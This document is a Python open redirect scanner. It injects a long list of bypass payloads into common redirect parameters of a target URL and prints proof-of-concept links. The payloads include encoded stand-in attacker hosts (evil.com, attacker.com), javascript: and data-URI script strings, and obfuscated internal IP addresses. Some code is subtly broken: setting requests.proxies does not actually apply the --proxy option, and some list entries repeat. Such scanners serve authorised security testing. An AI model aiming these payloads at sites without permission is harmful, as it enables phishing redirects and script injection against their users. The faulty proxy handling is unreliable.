#!/usr/bin/env python3
"""
Open Redirect Scanner
Detects open redirect vulnerabilities
"""

import requests
import argparse
import urllib.parse

# Open redirect payloads
PAYLOADS = [
    # Basic redirects
    "https://evil.com",
    "http://evil.com",
    "//evil.com",
    "///evil.com",
    "/\\evil.com",
    "\\evil.com",
    
    # Protocol-relative
    "//attacker.com",
    "//attacker.com/%2f%2e%2e",
    
    # URL encoding
    "%2f%2fevil.com",
    "%2f%2f%65%76%69%6c%2e%63%6f%6d",
    
    # Double encoding
    "%252f%252fevil.com",
    
    # Unicode encoding
    "\u002f\u002fevil.com",
    
    # Mixed encoding
    "/%09/evil.com",
    "/%00/evil.com",
    
    # Using @
    "https://target.com@evil.com",
    "https://target.com%40evil.com",
    "https://target.com%2540evil.com",
    
    # Using #
    "https://evil.com#target.com",
    "https://evil.com?target.com",
    
    # Using ?
    "https://evil.com?target.com",
    
    # Path traversal
    "/../evil.com",
    "/..\evil.com",
    
    # Data URI
    "data:text/html,<script>alert(1)</script>",
    
    # JavaScript
    "javascript:alert(1)",
    "javascript://evil.com/%0aalert(1)",
    
    # IP addresses
    "http://192.168.1.1",
    "http://0177.0.0.1",
    "http://2130706433",
    "http://0x7f.0.0.1",
    
    # IDN homograph
    "https://еxample.com",  # Cyrillic e
    
    # Common bypasses
    "https://target.com.evil.com",
    "https://evil.com/target.com",
    "/evil.com",
    "evil.com",
    "http://evil.com:80",
    "https://evil.com:443",
    
    # Null byte
    "https://evil.com%00target.com",
    "https://evil.com\x00target.com",
    
    # Carriage return
    "https://evil.com%0dtarget.com",
    "https://evil.com%0atarget.com",
    
    # Tab
    "https://evil.com%09target.com",
]

# Parameter names commonly used for redirects
REDIRECT_PARAMS = [
    "redirect",
    "redirect_to",
    "redirect_url",
    "url",
    "return",
    "return_to",
    "return_url",
    "next",
    "goto",
    "link",
    "target",
    "dest",
    "destination",
    "redir",
    "continue",
    "forward",
    "path",
    "location",
    "site",
    "page",
    "view",
    "show",
    "file",
    "document",
    "folder",
    "root",
    "path",
    "action",
    "success",
    "error",
    "logout",
    "login",
    "callback",
]


def test_redirect(url, param, payload):
    """Test for open redirect"""
    try:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        
        if param not in params:
            return False, None
        
        params[param] = payload
        new_query = urllib.parse.urlencode(params, doseq=True)
        test_url = parsed._replace(query=new_query).geturl()
        
        response = requests.get(test_url, timeout=10, allow_redirects=False)
        
        # Check for redirect
        if response.status_code in [301, 302, 303, 307, 308]:
            location = response.headers.get("Location", "")
            
            # Check if redirecting to our payload
            if "evil.com" in location or "attacker.com" in location:
                return True, f"Redirect to: {location}"
            
            # Check for partial match
            if payload in location:
                return True, f"Redirect to: {location}"
        
        # Check for JavaScript redirect
        if "evil.com" in response.text or "attacker.com" in response.text:
            if "window.location" in response.text or "location.href" in response.text:
                return True, "JavaScript redirect detected"
        
        return False, None
    except Exception as e:
        return False, str(e)


def scan_open_redirect(url):
    """Scan for open redirect vulnerabilities"""
    print(f"[*] Scanning: {url}\n")
    
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    
    if not params:
        print("[!] No parameters found")
        print("[*] Trying common redirect parameter names...")
        test_params = REDIRECT_PARAMS
    else:
        test_params = list(params.keys()) + REDIRECT_PARAMS
    
    vulnerabilities = []
    
    for param in test_params:
        print(f"[*] Testing parameter: {param}")
        
        for payload in PAYLOADS[:20]:  # Test first 20 payloads
            is_vuln, message = test_redirect(url, param, payload)
            if is_vuln:
                print(f"[+] Open redirect found!")
                print(f"    Parameter: {param}")
                print(f"    Payload: {payload}")
                print(f"    Details: {message}")
                vulnerabilities.append({
                    "param": param,
                    "payload": payload,
                    "message": message
                })
                break
    
    return vulnerabilities


def generate_poc(url, param, payload):
    """Generate proof of concept"""
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qs(parsed.query)
    params[param] = payload
    new_query = urllib.parse.urlencode(params, doseq=True)
    poc_url = parsed._replace(query=new_query).geturl()
    
    return poc_url


def main():
    parser = argparse.ArgumentParser(description="Open Redirect Scanner")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("--proxy", help="Proxy URL")
    parser.add_argument("--poc", action="store_true", help="Generate PoC URLs")
    parser.add_argument("-o", "--output", help="Output file")
    
    args = parser.parse_args()
    
    if args.proxy:
        requests.proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
    
    vulnerabilities = scan_open_redirect(args.url)
    
    print("\n" + "="*60)
    print("SCAN RESULTS")
    print("="*60)
    
    if vulnerabilities:
        print(f"\n[!] Found {len(vulnerabilities)} open redirect vulnerability(s):\n")
        for i, vuln in enumerate(vulnerabilities, 1):
            print(f"  {i}. Parameter: {vuln['param']}")
            print(f"     Payload: {vuln['payload']}")
            print(f"     Details: {vuln['message']}")
            
            if args.poc:
                poc = generate_poc(args.url, vuln['param'], vuln['payload'])
                print(f"     PoC: {poc}")
            print()
    else:
        print("\n[-] No open redirect vulnerabilities detected")
    
    if args.output and vulnerabilities:
        with open(args.output, 'w') as f:
            for vuln in vulnerabilities:
                f.write(f"Parameter: {vuln['param']}\n")
                f.write(f"Payload: {vuln['payload']}\n")
                f.write(f"Details: {vuln['message']}\n")
                if args.poc:
                    poc = generate_poc(args.url, vuln['param'], vuln['payload'])
                    f.write(f"PoC: {poc}\n")
                f.write("\n")
        print(f"[*] Results saved to: {args.output}")


if __name__ == "__main__":
    main()
